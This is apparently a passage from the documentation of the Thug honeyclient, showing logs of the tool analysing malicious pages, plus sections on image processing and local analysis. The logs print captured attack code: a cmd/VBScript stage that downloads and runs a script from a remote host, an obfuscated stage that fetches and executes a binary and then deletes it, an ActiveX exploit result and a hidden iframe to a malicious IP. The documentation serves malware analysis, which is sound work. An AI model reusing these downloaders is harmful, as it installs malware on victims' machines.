<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:30<span class="o">]</span> Microsoft Internet Explorer HCP Scheme Detected
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:30<span class="o">]</span> Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:30<span class="o">]</span> <span class="o">[</span>AST<span class="o">]</span>: Eval argument length &gt; <span class="m">64</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:30<span class="o">]</span> <span class="o">[</span>Windows Script Host Run<span class="o">]</span> Command:
cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe

<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:30<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Code:
cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:30<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Downloading from URL http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:32<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span> <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:32<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Saving file d26b9b1a1f667004945d1d000cf4f19e
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:22:32<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">2</span><span class="o">]</span> Code:
<span class="nv">w</span><span class="o">=</span><span class="m">3000</span>:x<span class="o">=</span><span class="m">200</span>:y<span class="o">=</span><span class="m">1</span>:z<span class="o">=</span>false:a <span class="o">=</span> <span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set <span class="nv">e</span> <span class="o">=</span> Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set <span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span>:b <span class="o">=</span> f <span class="p">&amp;</span> <span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT <span class="o">=</span> <span class="s2">&quot;GET&quot;</span>:Set <span class="nv">c</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set <span class="nv">d</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;am&quot;</span><span class="o">)</span>
Set <span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
On Error resume next
c.open OT, a, z:c.send<span class="o">()</span>
If c.Status <span class="o">=</span> x Then
d.Open:d.Type <span class="o">=</span> y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
End If
Set <span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>, Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>, <span class="s2">&quot;E&quot;</span><span class="o">))</span>
W.eXeC <span class="s2">&quot;taskkill /F /IM wm&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;player.e&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;xe&quot;</span>:W.eXeC <span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;e&quot;</span>:Set <span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span><span class="m">3</span>-1<span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>

<span class="s2">[2012-07-02 19:22:32] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
<span class="s2">[2012-07-02 19:22:38] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:22:39] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
<span class="s2">[2012-07-02 19:22:39] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
<span class="s2">[2012-07-02 19:22:39] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span><span class="m">56</span>:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:22:39] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:22:39] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:22:46] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:22:46] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">[2012-07-02 19:22:46] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:22:46] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:22:46] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;</span>
<span class="s2">[2012-07-02 19:22:46] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:22:49] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:22:49] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
</pre></div>
</div>
</div>
<div class="section" id="image-processing">
<h2>Image processing<a class="headerlink" href="#image-processing" title="Permalink to this headline">¶</a></h2>
<p>Image processing analysis (introduced in Thug 1.4) allows to analyze images retrieved during the
analysis. By default, Thug performs OCR analysis returning extracted strings but the possibility
exists to include other image processing algorithms through using Thug PyHooks. Be aware that
<em>pytesseract</em> is required to perform OCR analysis but this dependency is not installed by default
as the required steps could be different based on the Linux distribution. Please look at the section
<em>INSTALLATION</em> at <a class="reference external" href="https://github.com/madmaze/pytesseract">https://github.com/madmaze/pytesseract</a> for additional details.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~ $ thug -u win7ie90 -U -Y --image-processing www.google.com
<span class="o">[</span><span class="m">2020</span>-04-09 <span class="m">12</span>:18:51<span class="o">]</span> <span class="o">[</span>window open redirection<span class="o">]</span> about:blank -&gt; http://www.google.com
<span class="o">[</span><span class="m">2020</span>-04-09 <span class="m">12</span>:18:51<span class="o">]</span> <span class="o">[</span>HTTP Redirection <span class="o">(</span>Status: <span class="m">302</span><span class="o">)]</span> Content-Location: http://www.google.com/ --&gt; Location: https://www.google.com/?gws_rd<span class="o">=</span>ssl
<span class="o">[</span><span class="m">2020</span>-04-09 <span class="m">12</span>:18:51<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: https://www.google.com/?gws_rd<span class="o">=</span>ssl <span class="o">(</span>Status: <span class="m">200</span>, Referer: None<span class="o">)</span>
<span class="o">[</span><span class="m">2020</span>-04-09 <span class="m">12</span>:18:51<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: https://www.google.com/?gws_rd<span class="o">=</span>ssl <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: 6f1b8888e766930d42eda071cece248a<span class="o">)</span>
<span class="o">[</span><span class="m">2020</span>-04-09 <span class="m">12</span>:18:52<span class="o">]</span> <span class="o">[</span>script src redirection<span class="o">]</span> https://www.google.com/?gws_rd<span class="o">=</span>ssl -&gt; https://ssl.gstatic.com/gb/js/sem_574dafda1e043a99f540fbc649850c73.js
<span class="o">[</span><span class="m">2020</span>-04-09 <span class="m">12</span>:18:52<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: https://ssl.gstatic.com/gb/js/sem_574dafda1e043a99f540fbc649850c73.js <span class="o">(</span>Status: <span class="m">200</span>, Referer: https://www.google.com/?gws_rd<span class="o">=</span>ssl<span class="o">)</span>
<span class="o">[</span><span class="m">2020</span>-04-09 <span class="m">12</span>:18:52<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: https://ssl.gstatic.com/gb/js/sem_574dafda1e043a99f540fbc649850c73.js <span class="o">(</span>Content-type: text/javascript, MD5: f9acfd15f94beb685f01c6d6df397ff6<span class="o">)</span>
<span class="o">[</span><span class="m">2020</span>-04-09 <span class="m">12</span>:18:52<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> /images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png --&gt; https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png
<span class="o">[</span><span class="m">2020</span>-04-09 <span class="m">12</span>:18:52<span class="o">]</span> <span class="o">[</span>img redirection<span class="o">]</span> https://www.google.com/?gws_rd<span class="o">=</span>ssl -&gt; https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png
<span class="o">[</span><span class="m">2020</span>-04-09 <span class="m">12</span>:18:52<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png <span class="o">(</span>Status: <span class="m">200</span>, Referer: https://www.google.com/?gws_rd<span class="o">=</span>ssl<span class="o">)</span>
<span class="o">[</span><span class="m">2020</span>-04-09 <span class="m">12</span>:18:52<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png <span class="o">(</span>Content-type: image/png, MD5: b593548ac0f25135c059a0aae302ab4d<span class="o">)</span>
<span class="o">[</span><span class="m">2020</span>-04-09 <span class="m">12</span>:18:52<span class="o">]</span> <span class="o">[</span>OCR<span class="o">]</span> Result: Google <span class="o">(</span>URL: https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png<span class="o">)</span>
<span class="o">[</span>..<span class="o">]</span>
</pre></div>
</div>
</div>
<div class="section" id="local-analysis">
<h2>Local Analysis<a class="headerlink" href="#local-analysis" title="Permalink to this headline">¶</a></h2>
<p>May you need to analyze a locally saved page Thug provides the <em>-l (–local)</em> option to you.
Using such option is really simple and could turn to be really useful for testing and for
later (manual or automated) analysis (see also <em>Web Cache</em>)</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src $ thug -l ../samples/exploits/4042.html
<span class="o">[</span><span class="m">2012</span>-07-03 <span class="m">00</span>:12:23<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;target&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-07-03 <span class="m">00</span>:12:23<span class="o">]</span> ActiveXObject: DCE2F8B1-A520-11D4-8FD0-00D0B7730277
<span class="o">[</span><span class="m">2012</span>-07-03 <span class="m">00</span>:12:23<span class="o">]</span> <span class="o">[</span>Yahoo! Messenger <span class="m">8</span>.x Ywcvwr ActiveX<span class="o">]</span> Server Console Overflow
<span class="o">[</span><span class="m">2012</span>-07-03 <span class="m">00</span>:12:23<span class="o">]</span> UINT WINAPI WinExec <span class="o">(</span>
        <span class="nv">LPCSTR</span> <span class="o">=</span> <span class="nv">0x025d4b30</span> <span class="o">=</span>&gt;
                <span class="o">=</span> <span class="s2">&quot;calc.exe&quot;</span><span class="p">;</span>
        UINT <span class="nv">uCmdShow</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span>
<span class="o">)</span> <span class="o">=</span>  <span class="m">32</span><span class="p">;</span>
void ExitProcess <span class="o">(</span>
        UINT <span class="nv">uExitCode</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span>
<span class="o">)</span> <span class="o">=</span>  <span class="m">0</span><span class="p">;</span>
</pre></div>
</div>
<p>If you need to prevent remote content fetching while analyzing a locally saved page Thug
provides the <em>-x (–local-nofetch)</em> option to you. Let’s take a look at an example.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src $ thug -l ../samples/exploits/55875.html
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=utf-8&quot;</span> http-equiv<span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Acer Inc.&#39;s shares fell sharply Tuesday, one day after the Taiwanese computer maker said it would acquire Gateway Inc. for </span><span class="nv">$710</span><span class="s2"> million.  Acer said it ...&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;description&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;index,follow&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;robots&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Copyright (c)2007-2007 groundhogtech.com. All right reserved.&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;copyright&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;WordPress 2.2.1&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;generator&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:28<span class="o">]</span> <span class="o">[</span>Meta<span class="o">]</span> Generator: WordPress <span class="m">2</span>.2.1
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;document&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;resource-type&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:28<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/favicon.ico&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;shortcut icon&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:28<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/favicon.ico <span class="o">(</span>Status: <span class="m">204</span>, Referrer: None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:28<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/favicon.ico <span class="o">(</span>Content-type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: d41d8cd98f00b204e9800998ecf8427e<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:28<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css&quot;</span> <span class="nv">media</span><span class="o">=</span><span class="s2">&quot;screen&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:29<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css <span class="o">(</span>Status: <span class="m">200</span>, Referrer: None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:29<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: 64f3fd00b16de9316bf2b7b57925f4ca<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:29<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/feed/&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;alternate&quot;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;Groundhogtech RSS Feed&quot;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;application/rss+xml&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/feed/ <span class="o">(</span>Status: <span class="m">200</span>, Referrer: None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/feed/ <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: 0f3dffbe75d901cf28d63f2e8c945815<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:30<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;pingback&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php <span class="o">(</span>Status: <span class="m">200</span>, Referrer: None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: ce1ec1253cf77acb1a86d38c80a83ca2<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:30<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php?rsd&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;EditURI&quot;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;RSD&quot;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;application/rsd+xml&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php?rsd <span class="o">(</span>Status: <span class="m">200</span>, Referrer: None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php?rsd <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: d178bfd11bc1b88fc37be47b515210eb<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.vklabs.com/wordpress-themes/show-version-xhtml-ad-flex-niche.php?version<span class="o">=</span><span class="m">0</span>.8.9.8h <span class="o">(</span>Status: <span class="m">200</span>, Referrer: None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.vklabs.com/wordpress-themes/show-version-xhtml-ad-flex-niche.php?version<span class="o">=</span><span class="m">0</span>.8.9.8h <span class="o">(</span>Content-type: text/html, MD5: cd382dd315e1c83a108dd8009bad9f70<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:32<span class="o">]</span> &lt;iframe <span class="nv">frameborder</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginheight</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginwidth</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">scrolling</span><span class="o">=</span><span class="s2">&quot;no&quot;</span> <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;http://81.95.149.27/go.php?sid=1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;border:0px solid gray;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;0&quot;</span>&gt;&lt;/iframe&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:32<span class="o">]</span> <span class="o">[</span>iframe redirection<span class="o">]</span> about:blank -&gt; http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:42<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span> <span class="o">(</span>Status: <span class="m">408</span>, Referrer: None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:42<span class="o">]</span> <span class="o">[</span>Request Timeout<span class="o">]</span> URL: http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:42<span class="o">]</span> &lt;iframe <span class="nv">frameborder</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginheight</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginwidth</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">scrolling</span><span class="o">=</span><span class="s2">&quot;no&quot;</span> <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;http://81.95.149.27/go.php?sid=1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;border:0px solid gray;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;0&quot;</span>&gt;&lt;/iframe&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:42<span class="o">]</span> <span class="o">[</span>iframe redirection<span class="o">]</span> about:blank -&gt; http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span>
